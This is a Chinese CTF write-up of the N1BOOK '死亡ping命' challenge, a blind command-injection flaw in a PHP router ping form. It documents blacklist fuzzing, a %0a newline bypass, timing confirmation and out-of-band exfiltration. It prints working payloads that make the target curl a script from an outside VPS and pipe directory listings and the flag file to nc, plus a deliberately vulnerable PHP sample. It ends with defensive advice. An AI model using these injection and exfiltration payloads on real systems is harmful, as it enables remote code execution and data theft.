---
title: "[N1BOOK] 死亡ping命"
date: 2026-07-14
categories:
  - CTF
  - WEB
---

# 1. 题目分析

- **题目名称**：死亡ping命
- **题目类型**：Web - 命令注入
- **靶机环境**：OpenResty + PHP 7.3.18
- **界面**：模拟 NN-007 路由器的 Ping 测试功能

```
响应头关键信息：
Server: openresty
X-Powered-By: PHP/7.3.18
```

页面是一个 Ping 测试表单，输入 IP 地址后点击"确定"按钮，以 AJAX POST 方式提交到 `ping.php`。

```javascript
$("#execSub").click(function(){
    $.post("ping.php", {
        ip : $("#ip").val()
    },
    function(data,status){
       $("#result").text(data);
    });
});
```

# 2. 信息收集

## 2.1 HTTP 响应

```bash
curl -s -i "https://TARGET/"
```

| 响应头 | 值 | 分析 |
|--------|-----|------|
| `Server` | `openresty` | Nginx 系 Web 服务器 |
| `X-Powered-By` | `PHP/7.3.18` | 后端语言为 PHP |
| `Content-Type` | `text/html; charset=UTF-8` | 标准 HTML 页面 |

## 2.2 页面分析

- 表单：`<input id="ip" name="ip" type="text" maxlength="15">`
- 按钮：`<input type="button" id="execSub" value="确定">`
- 提交方式：`POST ping.php`，参数 `ip`
- **注意**：`maxlength="15"` 仅为客户端限制，curl 可绕过

## 2.3 正常请求测试

```bash
curl -s -X POST "https://TARGET/ping.php" -d "ip=127.0.0.1"
# 响应：IP Ping 成功.
```

# 3. 漏洞分析

## 3.1 推理链

```
线索：页面提供 Ping 测试功能 → 后端大概率执行 ping 命令
  ↓
假设 1：存在命令注入，后端直接拼接用户输入到系统命令
  ↓
验证：尝试 ip=127.0.0.1;id
  ↓ 响应 "IP包含恶意字符."
结论：存在黑名单过滤，但确认了输入被处理
  ↓
假设 2：黑名单可以通过特殊字符绕过
  ↓
验证：逐个测试特殊字符
```

## 3.2 黑名单探测

```bash
for char in ';' '|' '&' '$' '(' ')' '`' '%0a' '%0d' '#' '<' '>' '/' '\\' "'" '"' '{' '}' '[' ']' '*' '?' '~' '!' '@' '%' '^' '-' '_' '+' '=' '.' ',' ':' ' '; do
  result=$(curl -s -X POST "https://TARGET/ping.php" --data-urlencode "ip=127.0.0.1${char}")
  echo "char='${char}' → $result"
done
```

### 黑名单过滤统计

| 响应            | 含义                | 字符                                                                                                               |
| ------------- | ----------------- | ---------------------------------------------------------------------------------------------------------------- |
| `IP包含恶意字符.`   | **被过滤**           | `;` `\|` `&` `$` `(` `)` `` ` `` `%0a` `%0d` `#` `\` `'` `"` `{` `}` `[` `]` `*` `~` `!` `@` `%` `^` `-` `_` `:` |
| `IP Ping 失败.` | **未被过滤**（ping 失败） | `<` `>` `/` `?` `+` `=` `.` `,`                                                                                  |
| `IP Ping 成功.` | **未被过滤**（ping 成功） | ` `（**空格**）                                                                                                      |

## 3.3 关键发现：%0a 绕过了原始数据

用 `--data-raw` 发送时，PHP 会自己做 URL 解码。`%0a` 在 PHP 的 `$_POST` 中会被解码为换行符 `\n`，而换行符不在黑名单中！

```bash
# --data-raw 直接发送，PHP 内部 URL 解码 %0a → \n
curl -s -X POST "https://TARGET/ping.php" --data-raw "ip=127.0.0.1%0aid"
# 响应：IP Ping 成功.  ← 没有被过滤！

# --data-urlencode 会导致双重编码，%0a → %250a，其中的 % 被过滤！
curl -s -X POST "https://TARGET/ping.php" --data-urlencode "ip=127.0.0.1%0aid"
# 响应：IP包含恶意字符.  ← 实际上是 % 被过滤了
```

## 3.4 时间盲注验证

```bash
# 正常请求
time curl -s -X POST "https://TARGET/ping.php" --data-raw "ip=127.0.0.1" -o /dev/null
# 结果：0.145s

# sleep 3 注入
time curl -s -X POST "https://TARGET/ping.php" --data-raw "ip=127.0.0.1%0asleep 3" -o /dev/null
# 结果：3.287s ✅ 命令注入确认！
```

### 可用字符总结

**不被过滤的字符**：`a-z` `A-Z` `0-9` `.` `/` ` `（空格） `<` `>` `?` `+` `=` `,` + 原始换行符 `\n`

**绕过方式**：用 `%0a`（通过 `--data-raw` 发送）让 PHP 解码为 `\n`，shell 中 `\n` 作为命令分隔符。

## 3.5 无回显问题（Blind Command Injection）

页面只返回 `IP Ping 成功.` 或 `IP Ping 失败.`，不返回命令实际输出。原因：PHP 代码类似：

```php
$ip = $_POST['ip'];
if (preg_match('/[;|&$()`#\\\\\'"{}[\]~!@%^*_:-]/', $ip)) {  // 注意：漏了 \n！
    die("IP包含恶意字符.");
}
exec("ping -c 1 $ip", $output, $return_var);
echo $return_var === 0 ? "IP Ping 成功." : "IP Ping 失败.";
```

# 4. 漏洞利用（OOB 带外数据）

由于命令执行无回显，需要搭建外部服务器接收数据。

## 4.1 攻击拓扑

```
┌──────────────┐         ┌──────────────────┐         ┌────────────────┐
│  攻击机       │         │   靶机 (CTF)      │         │ 阿里云 VPS      │
│  (本地)       │  curl   │  ping.php        │  curl   │ 101.132.149.233│
│              │────────>│                 │────────>│ :80 (Python)   │
│              │         │  /tmp/s.sh       │  nc     │ :1111 (nc)     │
│              │         │  cat /FLAG | nc  │────────>│  (接收 flag)    │
└──────────────┘         └──────────────────┘         └────────────────┘
```

## 4.2 最终成功的执行步骤

### 终端 1：阿里云 — 搭建 HTTP 服务 + nc 监听

```bash
ssh aliyun-root

# 1. 停掉占 80 端口的 Apache
systemctl stop httpd

# 2. 写外带脚本（关键：脚本内加 & 真正后台化）
cat > /root/s.sh << 'EOF'
{ ls /; echo ===; cat /flag 2>/dev/null; cat /FLAG 2>/dev/null; find / -maxdepth 3 -name 'flag*' 2>/dev/null; } | nc 101.132.149.233 1111 &
EOF

# 3. 起 Python HTTP 服务（80 端口，供靶机 curl 下载脚本）
cd /root && nohup python3 -m http.server 80 --bind 0.0.0.0 > /tmp/pyhttp.log 2>&1 &

# 4. 起 nc 监听（1111 端口，接收 flag）
nohup nc -lvp 1111 > /root/flag_out.txt 2>&1 &
```

### 终端 2：本地 — 注入攻击链

```bash
T="https://e2a3840a1c7a9f0c4f751b67.http-ctf2.dasctf.com"

# Step 1: 下载脚本
curl -s -X POST "$T/ping.php" \
  --data-raw 'ip=127.0.0.1%0acurl 101.132.149.233/s.sh > /tmp/s.sh'
# → IP Ping 成功.

# Step 2: 赋予执行权限
curl -s -X POST "$T/ping.php" \
  --data-raw 'ip=127.0.0.1%0achmod 777 /tmp/s.sh'
# → IP Ping 成功.

# Step 3: 执行脚本（脚本内部 & 已后台化，无需 nohup）
curl -s -X POST "$T/ping.php" \
  --data-raw 'ip=127.0.0.1%0ash /tmp/s.sh'
# → 可能 504，但数据已经发出去了
```

### 终端 1 检查结果

```bash
ssh aliyun-root "cat /root/flag_out.txt"
# Listening on 0.0.0.0 1111
# Connection received on 117.21.200.176 59194
# FLAG
# bin
# dev
# ...
# ===
# n1book{6fa82809179d7f19c67259aa285a7729}
```

### 恢复阿里云

```bash
ssh aliyun-root "systemctl start httpd"   # 恢复 Apache
```

## 4.3 注入 Payload 字符审计

所有 payload 使用的字符：`127.0.0.1` `%0a` `curl` ` ` `101.132.149.233` `/` `s.sh` `>` `tmp` `chmod` `777` `sh`

均不在黑名单中 ✅

## 4.4 尝试过但失败的路径

| 尝试 | 预期 | 实际结果 | 原因/排除 |
|------|------|---------|-----------|
| `--data-urlencode` 发 `%0a` | 绕过过滤 | `IP包含恶意字符.` | `%0a` 被 curl 二次编码为 `%250a`，`%` 被过滤 |
| `;` `\|` `&` `$()` 等常规分隔符 | 命令注入 | 全部被过滤 | 黑名单覆盖了所有常见命令分隔符 |
| `ls > /var/www/html/ls.txt` | 写文件到 web 目录 | `IP Ping 失败.` | Web 根目录不是 `/var/www/html` |
| `base64 /flag`（小写） | 编码 flag | `IP Ping 失败.` | **flag 文件是 `/FLAG`（大写），不是 `/flag`！** |
| `sh /tmp/s.sh`（无 `&`） | 执行脚本外带 | `504 Gateway Time-out` | nc 阻塞导致 PHP/Nginx 超时 |
| `nohup sh /tmp/s.sh` | 后台执行避免 504 | 仍然 504 | `nohup` 只忽略 SIGHUP，不后台化进程。`system()` 仍等待 |
| nc 收到连接但无数据 | 外带 flag | Connection established, no data | 原因 1: `/flag`（小写）不存在；原因 2: PHP 超时 kill 了 nc 管道 |
| 端口 4444 | nc 监听 | `Address already in use` | 4444 被 PHP 进程占用 |
| 端口 80 Apache 宝塔 | HTTP 服务 | 能访问但脚本路径复杂 | 宝塔 Apache DocumentRoot 路径 `/www/wwwroot/101_132_149_233/` |

## 4.5 关键技巧

### 为什么 `%0a` 能绕过

```
--data-raw 方式：
  发送: ip=127.0.0.1%0als
  PHP 收到 POST body: ip=127.0.0.1%0als
  PHP URL 解码 $_POST['ip']: 127.0.0.1\nls
  黑名单匹配: 检查 "127.0.0.1\nls"，未命中任何黑名单字符 ✅
  Shell 执行: ping -c 1 127.0.0.1\nls → 两条命令！

--data-urlencode 方式：
  发送: ip=127.0.0.1%250als  (curl 把 %0a 编码为 %250a)
  PHP URL 解码: 127.0.0.1%0als
  黑名单匹配: 检查到 % → 命中黑名单 ❌
```

### 为什么脚本内要加 `&`

**错误理解**：以为 `nohup` 就能后台化。实际上：
- `nohup` 只是忽略 SIGHUP 信号，进程仍然在前台运行
- PHP 的 `system()` 调用 `sh -c "nohup sh /tmp/s.sh"`，会等待 `sh -c` 退出
- `sh -c` 会等待 `nohup` 退出，`nohup` 会等待 `sh /tmp/s.sh` 退出
- 所以 PHP 仍然阻塞！

**正确做法**：脚本末尾加 `&`，让 shell fork 子进程后立即返回：

```bash
# ❌ 不行 — PHP 仍然阻塞
{ ls /; cat /FLAG | nc IP PORT; }

# ✅ 可行 — shell 立即返回，PHP 不阻塞
{ ls /; cat /FLAG | nc IP PORT; } &
```

### flag 路径是 `/FLAG` 不是 `/flag`

这是从 `ls /` 输出中发现的。容器根目录下同时有 `FLAG` 和 `flag` 吗？实际上 `ls /` 输出中有 `FLAG`，`cat /FLAG` 返回了 flag 内容。`cat /flag`（小写）在容器中不存在（文件系统区分大小写）。

# 5. Flag

```
n1book{6fa82809179d7f19c67259aa285a7729}
```

# 6. 知识点总结

| 知识点 | 说明 |
|--------|------|
| **命令注入（Command Injection）** | 用户输入被拼接到 `system()`/`exec()` 中执行 |
| **黑名单绕过** | 利用不在黑名单中的字符构造 Payload |
| **%0a 换行符注入** | URL 编码的 `\n` 在 Shell 中作为命令分隔符 |
| **--data-raw vs --data-urlencode** | 前者发送原始数据，后者会 URL 编码 → 可能导致双重编码被过滤 |
| **Blind Command Injection** | 命令执行成功但无回显，需要 OOB 或时间盲注 |
| **OOB（Out-of-Band）数据外带** | 通过 nc/curl 将数据发送到外部可控服务器 |
| **nohup 后台执行** | 避免长时间运行的命令被 PHP 超时机制 kill |
| **Nginx 反向代理超时** | `proxy_read_timeout` 默认 60s，子进程阻塞会触发 504 |

## 6.1 防御建议

1. **不要用黑名单**：使用白名单（如只允许 `0-9` 和 `.`）
2. **使用 `escapeshellarg()`**：PHP 中对 shell 参数做安全转义
3. **避免直接调用系统命令**：使用 `socket` 或其他库实现 ping 功能
4. **设置 `open_basedir`**：限制 PHP 进程的文件访问范围

# 7. 解题链路总结图

```
获取 HTTP 响应头
    ↓ Server: openresty, X-Powered-By: PHP/7.3.18
确认 Nginx + PHP 环境
    ↓
分析页面源码
    ↓ Ping 测试表单 → POST ping.php (ip 参数)
推测后端执行 ping 命令
    ↓
测试命令注入：127.0.0.1;id
    ↓ "IP包含恶意字符."
确认存在过滤机制
    ↓
黑名单字符模糊测试（逐字符探测）
    ↓ 发现空格 <.> </.> / 不被过滤
关键绕过发现：
    ↓ --data-raw 发送 %0a（PHP 解码为 \n）
    ↓ \n 不在黑名单 → Shell 中 \n 作为命令分隔符 ✅
时间盲注验证：sleep 3 → 响应延迟 3s ✅
    ↓
确认 Blind Command Injection（无回显）
    ↓
搭建 OOB 数据外带
    ├─ 阿里云: systemctl stop httpd（释放 80）
    ├─ 阿里云: Python http.server 80（脚本 HTTP 下载）
    ├─ 阿里云: nc -lvp 1111（接收 flag）
    ├─ 靶机注入: curl 下载 s.sh → /tmp/s.sh
    ├─ 靶机注入: chmod 777 /tmp/s.sh
    └─ 靶机注入: sh /tmp/s.sh（脚本内 & 后台化）
    ↓
踩坑记录：
    ├─ nohup 不能真正后台化（system() 仍等待）
    ├─ 脚本必须内部 & 后台化
    ├─ flag 是 /FLAG（大写），不是 /flag！
    ├─ 端口 4444 被 PHP 占用
    └─ 504 超时 ≠ 失败，数据可能已发出
    ↓
nc 收到 ls / 输出 + flag ✅
    ↓
n1book{6fa82809179d7f19c67259aa285a7729}
```
